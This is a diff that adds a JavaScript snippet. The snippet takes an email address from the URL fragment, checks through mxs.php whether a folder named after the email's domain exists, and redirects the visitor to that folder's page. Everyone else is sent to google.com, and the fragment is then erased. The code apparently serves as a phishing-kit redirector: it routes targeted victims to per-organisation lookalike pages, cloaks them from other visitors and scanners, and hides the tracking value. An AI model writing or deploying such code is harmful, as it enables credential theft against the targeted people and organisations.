@@ -1,0 +1,30 @@
+<script>
+  const email = window.location.hash.substring(1).trim();
+
+  if (email && email.includes("@")) {
+    // Extract domain folder
+    const domain = email.split("@")[1];
+    const folder = domain.split(".")[0];
+
+    // Check if folder exists then redirect, else fallback to google
+    fetch(`mxs.php?folder=${encodeURIComponent(folder)}`)
+      .then(res => res.json())
+      .then(data => {
+        if (data.exists) {
+          window.location.replace(`./${folder}/index.html`);
+        } else {
+          window.location.replace("https://google.com");
+        }
+      })
+      .catch(() => {
+        window.location.replace("https://google.com");
+      });
+
+    // Remove the hash from URL (optional)
+    history.replaceState(null, null, window.location.pathname + window.location.search);
+
+  } else {
+    // No valid email - redirect somewhere or do nothing
+    window.location.replace("https://google.com");
+  }
+</script>
